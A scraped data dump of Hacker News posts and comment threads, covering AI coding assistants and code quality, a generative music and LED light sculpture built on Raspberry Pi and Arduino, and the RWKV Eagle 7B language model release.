hallucinate It helps me do things that I'd usually procrastinate from doing, yet I know how I can get them done. It is really a booster to ones performance if you know exactly what you want reply draxil 1 hour agoprevSurprise! As soon as you aren't thinking about your code and not understanding it... reply userbinator 12 hours agoprevThose who can't code better than an LLM will welcome it, those who can will abhor it. Unfortunately it seems there are far more of the former than the latter, and they aren't going to get better either. Progress comes from human intellect, mediocrity comes from regurgitation. reply moi2388 2 hours agoprevCopilot is great, as is gpt-4. I use it as search engine, to give me pointers about parts of the docs I might’ve missed. I have never not modified and refactored the code before implementing it. reply eggdaft 1 hour agoparentI also see LLMs primarily as a better search engine. Stack overflow gave us code snippets and was a huge step forward. Now we can find those snippets and explanations much faster. The secondary use is as a duck to bounce ideas off. A duck that is not as smart as a human but always available. And I can ask stupid questions to check my understanding. The final use is for code generation. If I’m super tired it can do trivial coding for me. Or if it’s boilerplate, which is very little code for me. Generally it doesn’t help a great deal within the IDE, and I’m not completely sure it’s a net win there yet. reply kvonhorn 14 hours agoprevQuality is best thought of as a process, and that process got pushed out of the SDLC by Agile process and its metric of velocity. The use of LLM-generated code to further increase velocity in the absence of quality process is an obvious result. reply itqwertz 3 hours agoprevAs someone with multiple projects, it helps with “good enough” or time-consuming tasks like filling out interfaces. basically it cuts down on context switch/flow state/ADD tendency time loss. reply cleandreams 13 hours agoprevI am worried that AI assisted code will be a competitive advantage so that the downsides will not be addressed until there are serious failures in critical code. Boeing but for power plants, for example. reply happytiger 13 hours agoprev> We further find that the percentage of 'added code' and 'copy/pasted code' is increasing in proportion to 'updated,' 'deleted,' and 'moved 'code. In this regard, AI-generated code resembles an itinerant contributor, prone to violate the DRY-ness [don't repeat yourself] of the repos visited. Couldn’t this equally be explained by the cost of refactoring becoming incredibly cheap? If most of your code is generated, and you don’t have to make the investment of hand crafting everything, aren’t you naturally going to be regularly replacing vast tracts? Obviously the trend may have implications, but in large part aren’t we just seeing the impact of code cheapening? Serious question. reply amiga1200 7 hours agoprevMuch like the Y2K bug kerfuffle, there will be a time when the Copilot bug will cause an upsurge in business requiring developers to fix the stochastic parrot code bugs. I think this will be sooner rather than later. reply rsynnott 14 hours agoprevShock horror, the thing everyone said would happen has happened. I mean, I’m not sure what people expected. reply andybak 14 hours agoparentSome people are thinking hard about a complex, nuanced topic of which we have very little past experience to draw on. I'm glad the conclusion is so self-evident to you. I must be a little slow. reply righthand 13 hours agorootparentML/LLMs are nuanced and complex topics as they are the inner workings of automation. People using ML/LLM to get around having to write code already understood well enough isn’t a complex nuanced topic because it is the outer workings of automation and has been studied in other fields quite extensively. No one should be surprised at the trend of lazier development from wide adoption of automation tools. reply andybak 13 hours agorootparentHow do past lessons about automation cleanly apply to AI code generation? Cleanly enough that there's no room for debate, doubt or discussion? (Edit. Not the same person. I keep making this mistake in discussion threads) Previously I wrote: > It's your tone of \"this is obvious, people! Why are you still wasting time thinking about it?\" that I'm taking exception to. reply righthand 10 hours agorootparentThere’s room for discussion on it and where to go from here, it’s the result that is not surprising. I would say instead of reacting to the rhetorical remarks, bring up the actual interesting discussion around it in your response. reply linsomniac 12 hours agoprevOn the other end of the spectrum, I'm finding ChatGPT is helping reduce the friction of adding unit tests, getting started with docstrings (I usually need to do a lot of work on them though), and type annotations. Plus I've had some luck with handing code to ChatGPT and asking it to suggest clearer ways of writing it. For example, a few months ago I was rewriting some particularly tricky, opaque code from Ansible having to do with the conversion of symbolic \"chmod\" strings into numeric. Because I was coming from code that was so hard to reason about (a bug in it took me a couple days to understand and fix), I wanted something really obvious and well tested. ChatGPT helped with that. https://github.com/linsomniac/symbolicmode/blob/main/src/sym... reply pylua 12 hours agoparentI think unit tests are suppose to induce friction to a certain extent. Using ai to do it seems like it is just checking a box. reply gnabgib 14 hours agoprevPreviously (same URL): [0](5 points, 2 days ago, 5 comments) [2](17 points) [3](9 points, 3 comments) \"Poor code quality due to AI assistants GitHub Copilot and ChatGPT\" [1](21 points, 2 days ago, 10 comments) [0]: https://news.ycombinator.com/item?id=39142285 [1]: https://news.ycombinator.com/item?id=39144366 [2]: https://news.ycombinator.com/item?id=39156643 [3]: https://news.ycombinator.com/item?id=39164079 reply hinkley 9 hours agoprevAnd a new generation learns the term, \"overtraining\".Someone wake me up in fifteen years when the next batch of students repeat history. reply ryanmcgarvey 15 hours agoprevMaybe it's worth reevaluating our definition of quality? In a world where AI can read our codebase, ingest a prompt, and quickly output \"correct\" if not clean and concise code, and then be abl",
    "originSummary": [
      "Research from GitClear reveals concerning trends in software development related to the use of AI-powered GitHub Copilot.",
      "The study found that relying on Copilot is associated with an increase in \"mistake code\" and a decrease in code refactoring and reuse, raising concerns about code maintainability.",
      "The research also highlights the prevalence of copy/pasted code, which can lead to future maintenance issues.",
      "These findings contradict previous studies that have shown increased productivity and developer satisfaction with Copilot.",
      "The report raises questions about the long-term impact of AI on code quality and who should take responsibility for addressing these issues."
    ],
    "commentSummary": [
      "The use of AI tools like GitHub Copilot and ChatGPT in programming is generating discussion.",
      "Concerns are raised regarding the impact on code quality, especially for non-trivial and SQL-related tasks.",
      "The debate includes polarized views on AI, resistance to nuanced discussions about its abilities, and reliance on AI for coding."
    ],
    "points": 387,
    "commentCount": 281,
    "retryCount": 0,
    "time": 1706464962
  },
  {
    "id": 39168986,
    "title": "\"I Need To Grow Away From These Roots\": Custom Music and Light Effects with Raspberry Pi and Arduino",
    "originLink": "https://www.vitling.xyz/i-need-to-grow-away-from-these-roots/",
    "originBody": "I Need To Grow Away From These Roots ~ vitling // David Whiting, 2023 Score A Enumerate every possible Major, Minor, Major 7th and Minor 7th chord and all possible inversions, beginning with A2 and ending with D5. Choose a random chord from the set. Play the chosen chord for 8 seconds Find all the chords from the set that have all but one note in common with the playing chord. Choose one of these at random. Go back to 3 and repeat forever. B Play a note from the currently playing chord in (A) on a random waveform for a random duration - repeat a random amount of times if the duration is short. Wait a random amount of time. Go back to 1 and repeat forever C Whenever a new chord is triggered by (A), illuminate each stem from root to tip with a colour corresponding to the each note of the chord. Notes adjacent in the cycle of 5ths have similar hues. D Whenever a note is played by (B), illuminate the tip of one of the stems with a light colour corresponding to the note. Realisation & Construction Parts A and B of the score are realised as a custom C++ program running on a Raspberry PI 3 B+, running both note selection and the synthesising of the audio buffers themselves. Parts C and D of the score are realised by an Arduino Uno board running a custom program, using FastLED to interface with the WS2812B protocol LED strips. Notes are communicated from the Raspberry Pi to the Arduino via signals sent through the serial port. The LED strips are run through transparent tubing designed for use in home aquariums. The tubes are strengthened into sculptable forms using thick nickel wire. The wooden housing under the plant pot contains the microcomputers, wiring, and a 3.5mm audio socket to connect to the soundsystem. Power enters via two mains connections The computers run headlessly and start automaticly upon powering up. [back]",
    "commentLink": "https://news.ycombinator.com/item?id=39168986",
    "commentBody": "I need to grow away from these roots (vitling.xyz)294 points by HansardExpert 14 hours agohidepastfavorite54 comments semi-extrinsic 12 hours agoThis person is also the creator of the marvellous \"endless acid banger\" which you can waste hours with in your browser, and which made me get my own physical 303 clone to start derping around with. https://www.vitling.xyz/toys/acid-banger/ Also of note: all the demos open to a silent \"click to start\" screen, and all the autoplaying videos are muted by default even, like on TFA. reply Tsiklon 1 hour agoparentThis is a wonderful little toy. As an aside is it difficult to pick up and use a 303 with no prior synth experience? reply bowsamic 33 minutes agorootparentI think the issue will be more the cost, they go for about 2500 to 3000 euros But yes arguably synth experience won't even help, the 303 sequencer is very weird and unlike any other sequencer reply Noumenon72 5 hours agoparentprevNeither of these pages show a \"click to start\" message for me, but they should. In TFA I had to hover over the \"silent gif\" to see a volume control, and in the acid banger I had written half of this comment before I figured out you could just click anywhere to unmute. reply jacquesm 4 hours agorootparentThat's a browser thing. Thank the advertising industry with their auto-playing audio ads. To get rid of that browsers now require you to engage with a page before audio can be played. reply lukan 2 hours agorootparent\"To get rid of that browsers now require you to engage with a page before audio can be played.\" Where \"engage\" just means any UI event, so also a simple mousemove over the area. reply krick 6 hours agoprevCan somebody recommend some music theory book/course for this algorithm or the one in https://www.vitling.xyz/toys/acid-banger/ to make sense? Obviously, there are some pretty simple rules to predict that something sounds alright, some more complicated ones, and baroque music is notoriously algorithmic. But I still have no clue. I tried to research something across these lines before, and I cannot quite recollect what exactly was the problem with the books I came across on my own (I think it was mostly just too basic to be useful), but somehow I never got any \"general\" understanding of \"how music works\". Even though I've got some very basic solfeggio training long time ago (admittedly, I was too young to ask questions I now find interesting and understand what's the purpose of what we were doing there, but at least I can read the notation). reply rogerclark 4 hours agoparentIn order for it to fully make sense, you will need to study it from multiple angles. Hooktheory.com, books, and lots of YouTube videos will get you there over the course of 1-10 years. Ultimately, you won't understand music theory without trying to write a lot of your own music. It's like programming: you can read a book about JavaScript, but if you never wrote software and you never plan to, there's simply no way to actually understand the book. An explanation of how this application might work (haven't verified from the source or letting it run long enough): let's say it chooses a subset of notes (\"scale degrees\") from a minor key, probably chosen at random. A subset of 5 or fewer notes from a scale (a pentatonic scale) will constrain the possible space of melodies so that most configurations will sound good. Even fewer and you get a more predictably pleasant (but perhaps less interesting) result. For instance, the notes that comprise the root chord will always sound good when played in any order. Acid lines typically suggest some kind of minor chord by playing an arpeggio (usually a repetitive melody consisting entirely of notes from a particular chord). Also, a subset of notes from one scale are always going to be present in another scale. You can transition (modulate) from one scale to another by having a section use a shared subset of notes, then switching to the new one. In this manner, you can have a single piece of music traverse all possible scales (in acid techno, almost entirely minor scales). reply jacquesm 4 hours agorootparent> Ultimately, you won't understand music theory without trying to write a lot of your own music. It's like programming: you can read a book about JavaScript, but if you never wrote software and you never plan to, there's simply no way to actually understand the book. That's a great observation, thank you! reply ghostpepper 3 hours agoparentprevIt's not a typical intro to theory but the \"pop psychology\" book This Is Your Brain On Music by Daniel J. Levitin includes something like what you're asking for: What is pitch, why do our brains \"like\" certain combinations of pitches and dislike others, etc. It's a fascinating book in its own right on a bunch of theories about the neurology of music but it includes a very basic introduction to theory at the beginning. reply jameshart 11 hours agoprevSomething fascinating about seeing a 'score' for generative music written out as a sort of specification like that. There's enough detail there that you can take those instructions and reimplement your own version of it, and you'll end up with essentially the same 'piece of music', but certainly a different interpretation of it. Because while the score lays out some details precisely, it leaves other choices less clear. What does 'all inversions' really mean when enumerating chords? Does it include open, spread voicings? What durations should we choose from for our random waveforms? How short is 'short' when deciding to repeat? And of course, what wave synths should you use, and how should you modulate them? All those are similar to the decisions a traditional instrumentalist makes when interpreting a sheet music score for performance - here, a generative music coder can follow this 'score' and produce a program that represents their own interpretation of the piece. Coding it up in Sonic Pi (https://sonic-pi.net/) was a fun exercise, and I feel like I was able to produce something along the lines of what the composer intended. It carries the same kind of mood that the recording in the video has. But it's my own 'performance' of the work, if that makes sense (even if it's actually Sonic Pi 'performing' it at runtime...) All of which got me thinking about the relationship more generally between specification, and implementation. Considering different programmers' implementations of algorithms as individual 'performances' of scores from the overall design - and then thinking about developers building elements of a larger system architecture as individual performers working to deliver their part of the performance as part of a band or orchestra. Some groups, maybe they're directed by a conductor-architect; others maybe are improvisers, riffing off one another and occasionally stepping up to deliver a solo. And some are maybe solid session performers, showing up and delivering strong but unflashy performances to a producer's specification. So overall, a nice meditative coding exercise for a Sunday afternoon, and a shift in perspective. Thanks for sharing it. reply joeblubaugh 7 hours agoparentOne of my favorite procedural visual artists has a similar vagueness to his specifications that leads to a nice variation each time a piece is recreated: https://www.sfmoma.org/artist/sol_lewitt/ https://massmoca.org/event/walldrawing305/ reply xanderlewis 10 hours agoparentprev> What does 'all inversions' really mean when enumerating chords? Does it include open, spread voicings? I think it usually just means: take the chord in its ‘root position’, and take inversions (that is, sort of (up to octaves) cyclic permutations) of it. So it would be leaving out lots of those more open, sparse voicings. reply jacquesm 4 hours agoparentprevIt doesn't sound like there are open chords in there, just the ones where the notes follow each other immediately without any gaps. reply sdenton4 8 hours agoparentprevA basic c maj chord is c4 f4 g4. Inversions move bottom notes to the top, like f4 g4 c5, or g4 c5 f5. They significantly change the flavor of the chord. reply jameshart 8 hours agorootparentYes, those are 'closed' voicings of the basic inversions, though. What about f4 c5 g5? Still a C/F, but an open voicing. I mentioned Sonic Pi in my post - it actually has a bunch of built in API support for this sort of thing. Generating all the basic inversions of all those chords for all those root notes is as simple as: (note_range :A2, :D5).each { |root| [:major, :minor, :major7, :minor7].each { |chord| chord_size = chord(root, chord).to_a.length for i in 0..chord_size do the_chord = chord(root, chord, inversion: i) end } } 'the_chord' gets set to arrays of midi notes corresponding to every inversion of every chord. reply recursive 5 hours agorootparentprevPretty sure that's a C sus4 reply uwagar 4 hours agorootparentprevi thot it was c4 e4 g4? reply danwills 20 minutes agoprevAwesome! reminds me of the tight-audiovisual sync style of the demoscene, but in hardware? Hope it gets explored some more! reply mrb 9 hours agoprevTip for author: you can drastically reduce hardware & software complexity of this project by removing the Arduino and use this library which allows controlling WS281x strips directly from your Raspberry Pi: https://github.com/jgarff/rpi_ws281x I use it myself on a Pi 4 to control a WS2815 strip of 466 pixels on the fascia of my house, for holiday decorations. reply j1elo 13 hours agoprevCurious about one of the technical details, I'm only asking to learn more about the limits of the RPi: couldn't this all be done only with the Raspberry Pi, using all those GPIO pins that it has? Feels like it is being underutilized and the project ought to be simplified to a single board (a single mains connection needed would be a very nice consequence too) reply ryandrake 12 hours agoparentI was thinking the same thing except the Arduino instead of the Raspberry Pi. All the Pi is doing is \"note selection and the synthesising of the audio buffers themselves.\" Surely the Arduino Uno can do that, too? reply jacquesm 7 hours agorootparentI think the Uno wouldn't have enough RAM for that, the Pi is a lot more powerful in that sense. reply xyzzy123 12 hours agoparentprevI think yes, but the LED code is designed for arduino so from a code reuse / prototyping perspective it would be simpler to do initial build with 2 units. reply whitepaint 14 hours agoprevThis is really cool, would be nice to get detailed instructions how to build something like that. reply rezmason 14 hours agoparentI think I now have to create an online version of it. Web Audio and CSS transforms should be more than up to the task. reply rezonant 13 hours agorootparentBest use audio worklets for best performance to avoid buffer underruns reply Lucasoato 13 hours agoprevThat could be the intro for a Four Tet set :) reply xanderlewis 12 hours agoparentYes! reply paraph1n 3 hours agoprevWhat do I search for to find music/audio like this? It sounds so beautiful. reply jacquesm 3 hours agoparentOlder ambient / minimal music / soundscapes. Try this: https://www.youtube.com/watch?v=x-OAHzyBIas or this: https://www.youtube.com/watch?v=8WGx5z9wVNY&list=PLfimnwaZdu... reply martijnvds 1 hour agoparentprevIt reminded me a bit of Plastikman, for example https://www.youtube.com/watch?v=oQduttGOQSE Probably because it uses the same 303's and 909's :) reply jacquesm 6 hours agoprevThis is beautiful. Imagine an alien planet where the plants are like this. Maybe a forest of them can sync up the way metronomes and firebugs synchronize. reply ehnto 6 hours agoprevI love nature, spend a lot of time in the forest. I find it all beautiful. Yet, sometimes, I am struck with disgust as somehow my image of trees swaps. Suddenly I imagine trees like an insidious growth on the surface of the planet. Like when you see fungi growing from a humans skin, I am involuntarily picturing trees through the same lens. It is breif, but weird. Anyway, this is a really beautiful display, it's branches feel closer to tendrils, and I imagine if the music had picked minor chords predominantly this would be an experience closer to my negative view of trees. Thankfully the power of music prevails. reply bad_username 6 hours agoparentImagine that trees sway on their own, rather than the wind moving them. reply psynister 11 hours agoprevSeems like they are being slashdotted or whatever it's called these days. reply danwills 14 minutes agoparentThe \"HackerNews Hug\" I believe it's called.. indeed being on the frontpage and being (or just looking) interesting does direct a huge amount of traffic at servers! I'm just so glad that HN seems not to be getting paid (or even influenced much?) to direct that fire-hose (as far as I know anyway!) Killer job dang! Can't believe you get so much done, kudos! reply fb03 13 hours agoprevThat was frigging awesome!!! reply crawsome 13 hours agoprevI love how they wrote it out in pseudocode for everyone to understand. I've worked on projects like this (just the music generation part) and I greatly appreciate how they presented it. And for someone to have a video demo, it just makes it better. Lots of code projects die before they take off because the author only described it with a wall of text. reply woliveirajr 9 hours agoprevSomehow reminded me of Jean Michel Jarre reply jacquesm 4 hours agoparentThe early days of synth, I would have picked Klaus Schulze as a close analogy, or maybe Brian Eno, The Pearl/Late October. reply bigiain 3 hours agorootparentMy head went \"Vangelis\" (And then it repeated \"Albedo, zero point three nine\"...) reply blackqueeriroh 13 hours agoprevI need one of these now! How much to make me one? reply bigiain 7 hours agoparentParts would be somewhere between $100 and $200. Someone with the right hardware skillset could put one together in a weekend pretty easily, maybe 10-15 hours work or so. Skills include RaspberryPi experience, Arduino experience, integration between RasPi and Arduino, addressable LED strip driven by Arduino experience, assembly (both electronics/soldering and artistic construction/sourcing of an enclosure and the \"pretty looking led strip in aquarium tube with wire stiffeners\" bits). Software is another skill required here, and for this you'll need both RasPi programming and Arduino programming, plus music specific knowledge and skills. That'll be a harder task to become or find someone with both skill sets. I'd expect top maybe be able to get the basic software for the RasPi/Arduino running in a weekend, but that iterating over configurations or \"compositions\" that look and sound interesting to be a long term ongoing project. If you don't have all or some those skills, you may find people at a local hackerspace/makerspace who'll help you out with this things, but I'd expect it to take at least 5-10 times as long to build it yourself with volunteer help than it'd take someone who already has all those skills. If you wanted to just commission someone to build/program one for you as a one off, I know a few people who do that kind of work, and I'd expect them to charge you $5k - $10k for it, if they're expected to provide some sort of warranty and ongoing support to you. (If you wanted small run production of then, I'd guess at something like $100-250k setup for scrappy startup style hardware manufacturing design, or closer to $250-$500k for contracted industrial design from an experienced industrial design firm. Then you might be able to manufacture them in production runs of 500-1000 for somewhere around $100 each, and six months later there'd be ripoffs on AliExpress for $49 plus shipping.) reply hackernewds 11 hours agoparentprevnext [5 more] money kills art reply bickeringyokel 9 hours agorootparentIf only art killed money reply jachee 5 hours agorootparentWoodie Guthrie’s guitar was a machine that kills fascists. reply adzm 6 hours agorootparentprevartists gotta eat reply uwagar 4 hours agorootparentprevwish we cud do art in communist society reply ruined 11 hours agoprevthat's that shit i like reply HansardExpert 14 hours agoprevGenerative audio-visual ambient light sculpture WS2812B / Arduino / Raspberry Pi / C++ reply uwagar 5 hours ago [flagged]prev [3 more] cheesy kitsch reply dang 4 hours agoparent [–] Ok, but could you please stop posting unsubstantive comments to HN? You've unfortunately been doing it repeatedly. It's not what this site is for, and destroys what it is for. If you wouldn't mind reviewing https://news.ycombinator.com/newsguidelines.html and taking the intended spirit of the site more to heart, we'd be grateful. reply uwagar 1 hour agorootparent [–] noted. just express myself for the record. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "\"I Need To Grow Away From These Roots\" is a project by vitling and David Whiting that focuses on creating custom programs for Raspberry Pi and Arduino boards.",
      "The project involves generating and controlling music and light effects using the custom programs.",
      "The program generates chords, selects random notes to play, and illuminates LED strips with corresponding colors. The project also includes a wooden housing with wiring and audio connections."
    ],
    "commentSummary": [
      "The discussion touches on a range of music and programming topics, such as the vitling.xyz website, using a 303 synthesizer, autoplaying videos, learning music theory, coding music with Sonic Pi, and a project involving chords and inversions.",
      "There is also mention of a video installation, comparisons to Plastikman's music, server challenges, and the cost of building and programming an LED strip with Arduino."
    ],
    "points": 294,
    "commentCount": 54,
    "retryCount": 0,
    "time": 1706470163
  },
  {
    "id": 39172837,
    "title": "Eagle 7B: Open-source AI Model Outperforms Transformers in Multi-lingual Benchmarks",
    "originLink": "https://blog.rwkv.com/p/eagle-7b-soaring-past-transformers",
    "originBody": "Share this post 🦅 Eagle 7B : Soaring past Transformers with 1 Trillion Tokens Across 100+ Languages blog.rwkv.com Copy link Facebook Email Note Other Discover more from RWKV Open Source Development Blog Development blog for the RWKV open source architecture, and their derivative OSS models Subscribe Continue reading Sign in 🦅 Eagle 7B : Soaring past Transformers with 1 Trillion Tokens Across 100+ Languages A brand new era for the RWKV-v5 architecture and linear transformer's has arrived - with the strongest multi-lingual model in open source today Eugene Cheah Jan 29, 2024 6 Share this post 🦅 Eagle 7B : Soaring past Transformers with 1 Trillion Tokens Across 100+ Languages blog.rwkv.com Copy link Facebook Email Note Other 3 Share An eagle, flying past a transformer-looking robot Eagle 7B - in short Eagle 7B is a 7.52B parameter model that: Built on the RWKV-v5 architecture (a linear transformer with 10-100x+ lower inference cost) Ranks as the world’s greenest 7B model (per token) Trained on 1.1 Trillion Tokens across 100+ languages Outperforms all 7B class models in multi-lingual benchmarks Approaches Falcon (1.5T), LLaMA2 (2T), Mistral (>2T?) level of performance in English evals Trade blows with MPT-7B (1T) in English evals All while being an “Attention-Free Transformer” Is a foundation model, with a very small instruct tune - further fine-tuning is required for various use cases! We are releasing RWKV-v5 Eagle 7B, licensed as Apache 2.0 license, under the Linux Foundation, and can be used personally or commercially without restrictions Download from Huggingface, and use it anywhere (even locally) Use our reference pip inference package, or any other community inference options (Desktop App, RWKV.cpp, etc) Fine-tune using our Infctx trainer Try it online on Huggingface [Pending PR] Get it merged into Huggingface transformers! Multi-Lingual Performance details We performed multi-lingual performance across the following benchmarks: xLAMBDA, xStoryCloze, xWinograd, xCopa Across a total of 23 languages Most of these benchmarks cover common sense reasoning, in their respective languages. And show a huge overall jump in multi-lingual performance for RWKV v4-to-v5 architecture. And the v2 world dataset. It should also be noted, that there is a lack of multi-lingual benchmarks, as the above covers approximately the top 23 languages. This makes it hard to evaluate model language performance directly over the remaining 75+ languages, over the total 100+ trained languages. A shortcoming we hope to improve in future models. English Performance details English performance was measured across 12 separate benchmarks, across commonsense reasoning, and world knowledge Once again we see a huge overall jump from RWKV v4-to-v5 architecture. And the v2 world dataset. Where v4 previously lost out to MPT-7b, the top model in the 1T token tier. v5 begins trading blows in benchmarks, in some cases even coming on top in certain benchmarks ( LAMBADA, StoryCloze16, WinoGrande, HeadQA_en, Sciq ) over Falcon, or even llama2. In addition, v5 performance starts to fall in line with the expected transformer performance level, with its given approximate token training count. With Mistral-7B maintaining its lead with its rumored 2~7 Trillion token training. We expect to narrow the gap, as we train an additional 1T token, to cross the llama2 line and hopefully reach the mistral line. Alternatively, as a base model, which is lightly tuned (really small instruct set mixed in), we are eager to see how the various community and instruct-tuned variants Perhaps a good dataset + Scalable architecture: is all you need? A notable observation was that our checkpoints near the 300 Billion token point, show similar performance to pythia-6.9b This is consistent with previous pile-based experiments on our RWKV-v4 architecture, that linear transformers like RWKV scale similarly in performance levels to transformers, with the same token count training. If so, it does repeat the question. If the exact architecture, matter less than the data for the model eval performance? CUDA computational cost, for RWKV-based architecture vs transformer models - that quadratic-vs-linear really scales! If true, perhaps we should seek more efficient and scalable architecture, to increase accessibility, drive the cost of AI downwards for everyone, and lessen the impact on our environment. Building inclusive AI for everyone in this world - not just the English A common feedback we receive for the RWKV multi-lingual approach is it hurts our English evaluation scores and slows the growth of linear transformers that it is not fair to compare the multi-lingual performance of a multi-lingual model -vs- a purely English model And for most parts, we agree on both points. But we have no plans on changing this, as we are building AI for the world - which is not just an English world. In 2023, only 17% of the world's population speaks English ( 1.3 billion people ) World Map showing the distribution of regions and people who are fluent in English (source: Wikipedia) However, by ensuring support for the top 25 languages in the world and beyond, we can cover approximately 4 billion people, or 50% of the world Incomplete map, of regions where the Eagle Language model will support entirely or partially This aligns well with the team’s common goal, of getting AI to support everyone, not just by allowing it to run cheaply and affordably even on lower-end hardware. But by supporting their language. Over time, we intend to grow the multi-lingual dataset, to support a wider variety of languages, and to slowly grow that coverage to 100% of the world - to ensure no language gets left behind. The RWKV discord community today grew due to our low inference cost, and its wide range of support for various languages.(https://discord.com/invite/T5JGfMvWA5) A major example of this in our community is the Indonesian-NLP discord group, which finetunes an Indonesian language model from the RWKV line of base models. Allowing them to build strong language-specific models - on a cheap affordable basis (ie. single node), without needing to do half a million dollars of pre-training. Future Plans This release marks the release of the strongest linear transformer (in terms of eval benchmarks) to date. While it may not have succeeded in passing LLaMA2 and Mistral. It provides strong evidence of the following The RWKV-v5 model architecture scales similarly to transformer performance with a similar token count You can achieve a near LLaMA2-like level of performance, with a substantially lower inference cost While supporting multi-lingual levels of performance We plan to follow by pushing further ahead with [Feb 2024] An updated RWKV v5: Eagle paper, where we will go deeper in-depth on the architecture changes since v4, and the model benchmarks and evals [Feb 2024] A further 1T token in training (2T total), for direct comparisons with the LLaMA2 7B model [Mar 2024] An MoE model based on the v5 Eagle 2T model [Mar 2024] RWKV-v6: “Finch” 1.5B, 3B world models Disclaimer: All dates are approximate, and is heavily subjected to compute avaliability from our sponsors/provider Acknowledgment We are grateful and would like to thank the following key groups: StabilityAI for the bulk of the computing provided to train this foundation model EleutherAI for their support, especially in the ongoing paper-writing process Linux Foundation AI & Data group for supporting and hosting the RWKV project Along with the various developers, working on the growing collection of RWKV-related projects. Thanks for reading RWKV Open Source Development Blog! Subscribe for free to receive new posts and support my work. Subscribe 6 Share this post 🦅 Eagle 7B : Soaring past Transformers with 1 Trillion Tokens Across 100+ Languages blog.rwkv.com Copy link Facebook Email Note Other 3 Share Previous A guest post by Eugene Cheah Builds Attention-Free Transformer AI models (http://wiki.rwkv.com) from scratch Also k8s infra & UI testing tools (http://uilicious.com), webapps, and GPU.js (http://gpu.rocks) Hot-takes/Views are my own Subscribe to Eugene",
    "commentLink": "https://news.ycombinator.com/item?id=39172837",
    "commentBody": "Eagle 7B: Soaring past Transformers (rwkv.com)259 points by guybedo 5 hours agohidepastfavorite52 comments coder543 4 hours agoIt’s cool that progress is being made on alternative LLM architectures, and I did upvote the link. However, I found this article somewhat frustrating. Showing the quality of the model is only half of the story, but the article suddenly ends there. If people are going to be motivated to adopt an entirely different architecture, then performance and context size deserve at least as much discussion. Given the linear nature being shown, it seems like the primary thing people are going to want to see is the next frontier of LLMs: context sizes of ~1M tokens. The word “context” does not even appear in this article, which is disappointing. If there were a discussion of context, it would be nice to see if it passes the passkey test. The article also appears to reuse a chart from RWKV-4 showing how awesome a linear function is compared to a quadratic one, but… cool story? It’s not even clear what this chart is truly showing. Is this chart only showing generated tokens, or is this including prompt tokens? As I have never used RWKV, I have no idea how the prompt processing speed compares to the token generation speed. Prompt processing speed has been a big problem for Mixtral, for example. As a reader, I want to see a couple of actual examples of X prompt tokens + Y generated tokens, and the tokens/s of X and Y for RKWV-5 and for Mistral on the same hardware. On the Mistral side, it is trivial to collect this information in llama.cpp, but I don’t know how the tooling is for RWKV. reply marmaduke 3 hours agoparentThese models don't have a fixed context size and are progressively fine-tuned for longer and longer contexts. The context length also doesn't impact inference cost. Another aspect of performance is not just how well does the trained model perform, but is it data efficient (performance per token trained)? The comparison with Pythia (an open GPT) is shown in the article. The rwkv4 paper is quite detailed and has examples of prompt and responses on the last few pages https://arxiv.org/abs/2305.13048 And iirc rwkv5 is very similar to retnet which is detailed here https://arxiv.org/abs/2307.08621 Edit now that I thought more about, the data efficiency seems like a highly important aspect given their noble goal to be fully multi lingual. This is fairly interesting theoretically as well and for other applications where abundance of data is not a given reply Harrisonv 3 hours agoparentprevFor linear transformers, the current metric is \"perfect token recall\", the ability for the model to recall a randomized sequence of data. You can find the limit of a particular model architecture by training a model of a particular size to echo randomized data, and I believe this was touched on in the zoo-ology paper. This doesnt prevent the model from retaining sequences or information beyond this metric, as information can easily be compressed in the state, but it anything within that window can be perfectly recalled by the model. Internal testing has placed the value for Eagle around the 2.5k ptr[perfect token recall] mark, while community fine tunes done on the partial checkpoints for long distance information gathering and memorization have been shown to easily dwarf that. prompt processing speed benefits from the same gemm optimizations as standard transformers, with the extra benefit of those gemm optimizations working for batch inference as well (no need for vllm as memory allocation is static per agent) reply Szpadel 3 hours agoparentprevRWKV does not have context size, or in other way do look at it, it does have infinite one. As far as I understand this, there is internal state that holds new information while reading input, later information can overwrite previous ones with is arguably human like behaviour. reply wokwokwok 2 hours agorootparentOne of three things has to be true. Either: a) this is false b) perfect recall is false (ie. as the internal state is overwritten, you lose information about previous entries in the context) c) the inference time scales by the context length. It’s not possible to have perfect recall over an arbitrary length in fixed time. Not hard. Totally not possible at all That would mean you can scan an infinite amount of data perfectly in fixed time. So… Hrm… this kind of claim rings some kind of alarm bells, when it’s combined with this kind of sweeping announcement. It seems to good to true; either it’s not that good, or the laws of the universe no longer hold true. reply sebzim4500 36 minutes agorootparent(b) is the sacrifice made in these linear attention type architectures. As a mitigation, you can leave a few normal attention layers in the model but replace the rest. reply Harrisonv 2 hours agorootparentprevperfect recall is often a function of the architecture allowing for data to bleed through linkages. you can increase the perfect token recall through dialated wavenet structures, or, in the case of v5, the use of multi-head linear attention creates multiple pathways where information can skip forward in time reply jaster 43 minutes agorootparentprevHere is a relevant tidbit from the RWKV paper \"Limitations\" section (https://arxiv.org/abs/2305.13048): First, the linear attention of RWKV leads to significant efficiency gains but still, it may also limit the model’s performance on tasks that require recalling minutiae information over very long contexts. This is due to the funneling of information through a single vector representation over many time steps, compared with the full information maintained by the quadratic attention of standard Transformers. In other words, the model’s recurrent architecture inherently limits its ability to “look back” at previous tokens, as opposed to traditional self-attention mechanisms. While learned time decay helps prevent the loss of information,it is mechanistically limited compared to full self-attention. reply warkdarrior 3 hours agorootparentprevIf later input overwrites previous input in the internal state, it means the model does have a limit to how much input it can \"remember\" at any given time and that limit is less than infinite. reply viraptor 2 hours agorootparentYou can think of it like your own memory. Can you remember a very important thing from 10 years ago? Can you remember every single thing since then? Some things will remain for basically infinite period, some will have a more limited scope. reply Eisenstein 3 minutes agorootparentI'm not sure I understand your concept of human memory. It is pretty well established that very few people are able to remember details of things for any reasonable period of time. The way that we keep those memories is by recalling them and playing the events over again in our mind. This 'refreshes' them, but at the expense of 'corrupting' them. It is almost certain that things important to you that you are sure you remember correctly are wrong on many details -- you have at times gotten a bit hazy on some aspect, tried to recall it 'figured it out' and stored that as your original memory without knowing it. To me, 'concepts', like doing math or riding a bike, on the other hand, are different in the sense that you don't know how to ride a bike, as in you couldn't explain the muscle movements needed to balance and move on a bicycle, but when you get on it, you go through the process of figuring out the process again. So even though you 'never forget how to ride a bike' you never really knew how to do it, you just got good at learning how to do it incredibly quickly every time you tried. Can you correct me on any misconceptions I may have about either how I think memories work, or how my thoughts should coincide with how these models work? reply canjobear 3 hours agorootparentprevIn principle it has no context size limit, but 